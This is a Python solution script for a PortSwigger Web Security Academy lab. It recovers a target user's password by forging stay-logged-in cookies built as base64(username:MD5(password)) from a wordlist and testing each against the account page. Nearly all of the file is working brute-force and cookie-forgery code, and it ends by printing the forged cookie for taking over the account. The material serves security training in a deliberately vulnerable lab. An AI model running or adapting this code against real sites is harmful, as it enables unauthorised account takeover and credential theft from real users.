# Lab 09 — Brute-forcing a stay-logged-in cookie
# PortSwigger: https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie
#
# Vulnerability: stay-logged-in cookie is base64(username:MD5(password)) —
#                predictable and forgeable for any user whose password is in
#                a common wordlist
# Aim:           Forge carlos's stay-logged-in cookie and access his account
#
# Technique:
#   For each password candidate:
#     1. MD5 hash the candidate
#     2. Build "carlos:<hash>"
#     3. Base64-encode the result
#     4. Submit as the stay-logged-in cookie to GET /my-account
#     5. 200 OK with carlos's account data = correct password found
#
# Usage: python authentication_lab09.py <url> <passwords_file>

import sys
import hashlib
import base64
import urllib3
from proxies import proxies
from authentication_utils import (banner, section, make_session, login,
                                   load_wordlist, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def forge_cookie(username, password):
    """Build base64(username:MD5(password)) — the insecure cookie format."""
    md5_hash = hashlib.md5(password.encode()).hexdigest()
    raw = f"{username}:{md5_hash}"
    return base64.b64encode(raw.encode()).decode()


def brute_force_cookie(session, url, username, passwords):
    print(f"  ➜  Forging and testing {len(passwords)} cookies for {username!r}...\n")
    for i, password in enumerate(passwords, 1):
        cookie_val = forge_cookie(username, password)
        r = session.get(
            f"{url}/my-account",
            cookies={"stay-logged-in": cookie_val},
            allow_redirects=True
        )
        if r.status_code == 200 and username in r.text:
            print(f"  ✔  Valid cookie forged!")
            print(f"     Password   : {password!r}")
            print(f"     MD5 hash   : {hashlib.md5(password.encode()).hexdigest()}")
            print(f"     Cookie val : {cookie_val}")
            return password, cookie_val

        if i % 100 == 0:
            print(f"  ·  {i}/{len(passwords)} tried...")

    return None, None


if __name__ == "__main__":
    banner()
    section("LAB 09 — BRUTE-FORCING A STAY-LOGGED-IN COOKIE")

    if len(sys.argv) != 3:
        print("  Usage: python authentication_lab09.py <url> <passwords_file>")
        sys.exit(1)

    url, pfile = sys.argv[1], sys.argv[2]
    session = make_session(proxies)

    # ── Step 1: log in as wiener and decode our own cookie to confirm format ─
    print("\n  ── Step 1: log in as wiener, inspect our own stay-logged-in cookie\n")
    if not login(session, url):
        sys.exit(1)

    our_cookie = session.cookies.get("stay-logged-in", "")
    if our_cookie:
        decoded = base64.b64decode(our_cookie).decode()
        print(f"  ✔  Our cookie decoded: {decoded}")
        md5_of_peter = hashlib.md5(b"peter").hexdigest()
        if md5_of_peter in decoded:
            print(f"  ✔  Confirmed format: username:MD5(password)")
            print(f"     MD5('peter') = {md5_of_peter}\n")
    else:
        print("  ?  No stay-logged-in cookie found — ensure 'Stay logged in' was ticked")
        print("     This script will still attempt cookie brute-force\n")

    # ── Step 2: brute-force carlos's cookie ──────────────────────────────────
    section("Step 2: Brute-Force carlos's stay-logged-in Cookie")
    passwords = load_wordlist(pfile)
    if not passwords:
        sys.exit(1)

    valid_pass, valid_cookie = brute_force_cookie(session, url, "carlos", passwords)
    if not valid_pass:
        print("  ✘  No valid cookie found in wordlist")
        sys.exit(1)

    print_box("SUCCESS", f"carlos's password : {valid_pass}\nForged cookie    : {valid_cookie}")
    print("  ➜  Use this cookie in your browser to access carlos's account:")
    print(f"     Name:  stay-logged-in")
    print(f"     Value: {valid_cookie}")
